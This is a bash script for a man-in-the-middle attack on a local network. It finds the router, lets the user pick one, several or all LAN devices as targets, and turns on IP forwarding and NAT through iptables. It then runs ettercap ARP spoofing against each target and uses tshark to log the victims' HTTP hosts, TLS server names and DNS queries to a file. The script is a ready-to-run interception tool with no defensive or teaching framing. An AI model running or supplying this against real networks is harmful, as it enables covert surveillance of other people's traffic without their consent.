#!/bin/bash

# Colors for output
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
NC="\e[0m" # No color

# Ensure script is run as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root (use sudo).${NC}"
   exit 1
fi

# Detect active network interface
INTERFACE=$(ip route | grep default | awk '{print $5}')
if [ -z "$INTERFACE" ]; then
    echo -e "${RED}[!] Error: Could not detect network interface.${NC}"
    exit 1
fi

# Detect Router IP
ROUTER_IP=$(ip route | grep default | awk '{print $3}')
if [ -z "$ROUTER_IP" ]; then
    echo -e "${RED}[!] Error: Could not detect router IP.${NC}"
    exit 1
fi

LOG_FILE="busted.log"

echo -e "${GREEN}[*] Using network interface: $INTERFACE${NC}"
echo -e "${GREEN}[*] Detected router IP: $ROUTER_IP${NC}"

echo -e "${YELLOW}[*] Select attack mode:${NC}"
echo "    1) Single target"
echo "    2) Multi-target"
echo "    3) All devices (excluding router)"
read -r ATTACK_MODE

TARGET_IPS=()

if [ "$ATTACK_MODE" == "1" ]; then
    echo -e "${YELLOW}[*] Enter target IP:${NC}"
    read -r SINGLE_TARGET
    TARGET_IPS+=("$SINGLE_TARGET")

elif [ "$ATTACK_MODE" == "2" ]; then
    echo -e "${YELLOW}[*] Enter target IPs separated by spaces:${NC}"
    read -r MULTI_TARGETS
    TARGET_IPS=($MULTI_TARGETS)

elif [ "$ATTACK_MODE" == "3" ]; then
    echo -e "${YELLOW}[*] Scanning network for devices...${NC}"
    TARGET_IPS=($(sudo arp-scan --localnet | awk '{print $1}' | grep -E "192.168.*" | grep -v "$ROUTER_IP"))
    if [ ${#TARGET_IPS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No devices found.${NC}"
        exit 1
    fi
else
    echo -e "${RED}[!] Invalid selection. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}[*] Enabling IP forwarding...${NC}"
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Setup iptables for NAT
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

# Cleanup function
cleanup() {
    echo -e "${YELLOW}\n[*] Restoring network settings...${NC}"
    sudo pkill ettercap
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[*] Cleanup complete. Exiting.${NC}"
    exit 0
}
trap cleanup SIGINT SIGTERM

# Start ARP spoofing with ettercap
echo -e "${GREEN}[*] Running ARP spoofing...${NC}"
for TARGET_IP in "${TARGET_IPS[@]}"; do
    sudo ettercap -T -q -i "$INTERFACE" -M arp:remote /$TARGET_IP// /$ROUTER_IP// &
done

sleep 3

# Capture HTTP, DNS, and TLS SNI
echo -e "${GREEN}[*] Capturing network traffic...${NC}"
sudo tshark -i "$INTERFACE" -Y "http or tls.handshake.extensions_server_name or dns.qry.name" -T fields -e ip.src -e http.host -e tls.handshake.extensions_server_name -e dns.qry.name | awk -v router="$ROUTER_IP" '{if ($1 != router && $2) print $1, "→", $2; fflush(stdout);}' | tee -a "$LOG_FILE"

# Cleanup on exit
